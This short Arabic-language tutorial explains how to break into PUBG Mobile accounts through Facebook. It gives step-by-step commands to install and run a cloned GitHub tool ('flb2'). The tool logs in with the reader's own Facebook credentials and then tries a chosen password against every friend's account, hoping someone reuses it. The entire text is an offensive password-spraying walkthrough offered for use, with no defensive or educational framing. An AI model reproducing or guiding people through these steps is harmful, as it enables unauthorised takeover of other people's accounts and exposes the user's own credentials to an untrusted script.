اليوم بنشرح طريقة اختراق حسابات ببجي موبايل عن طريق الفيسبوك و نبدا بسم الله

-1 تكتب الامر
apt update
و اذا جاك [ Y / N ] تختار Y
-2 تكتب الامر
apt upgrade
و اذا جاك [ Y / N ] تختار Y
-3 تكتب الامر
pkg install python2 git
و اذا جاك [ Y / N ] تختار Y
-4 تكتب الامر
git clone
https://github.com/nasirxo/flb2.git

-5 تكتب الامر 
cd flb2
-6 تكتب الامر
chmod +× *
-7 تكتب الامر
python2 flb2.py

بعد الامر الاخير تنتظر شوي راح يجيك كذا
[-] Username : تحط ايميل حسابك فيسبوك
[-] Password : و تحط رمز حسابك فيسبوك
------------------------------------------------------------
Login Sucessfully اذا جاك كذا يعني تم التسجيل بنجاح

بعدها حيجيك 
[-] Total Accounts : عدد الاصدقاء الي عندك

و بيكتبلك

[>] Password to try on accounts
ذا يعني تحط اي رمز مثال : 12345566

و تضغط انتر و راح يبدا يخمن على الحسابات بعدها انت و حظك اذا احد حاط الرمز ذا بيطلعلك تقدر تجرب اكثر من رمز
